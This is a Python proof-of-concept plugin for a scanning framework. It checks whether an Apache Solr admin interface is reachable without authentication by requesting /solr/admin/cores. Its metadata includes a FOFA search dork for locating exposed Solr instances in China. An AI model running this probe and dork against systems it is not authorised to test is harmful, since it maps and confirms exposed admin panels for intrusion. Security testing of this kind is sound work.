# coding:utf-8  
import requests
from lib.core.common import url_handle
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author" : "Du9r1",                 # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-11-2",         # POC创建时间
        "UpdateDate" : "2022-11-2",         # POC创建时间
        "PocDesc" : """
            略
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Solr未授权访问",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可

        "AppName" : "solr",                     # 漏洞应用名称
        "AppVersion" : "全版本",                  # 漏洞应用版本
        "VulnDate" : "2021-03-10",                    # 漏洞公开的时间,不知道就写能查到的最早的文献日期，格式：xxxx-xx-xx
        "VulnDesc" : """
        Solr应用服务器安装后未进行管理界面访问限制,导致管理界面可直接进行访问,泄露敏感信息并可对Solr进行进一步的管理。
        当开发者配置不当时就可能造成未授权访问漏洞。
        """,                                # 漏洞简要描述

        "fofa-dork":'title="solr"&&country="CN"',                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  

    }

    timeout = 10

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/solr/admin/cores" # url自己按需调整

        headers = {"User-Agent":"Mozilla/5.0 (Windows ME; U;cd en) Opera 8.51",
                    "Connection":"close"}

        try:
            """
            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy , timeout = self.timeout,verify = False)
            if req.status_code == 200 and "responseHeader" in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,""]
        except Exception as e:
            raise e

        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln


    def _attack(self):
        return self._verify()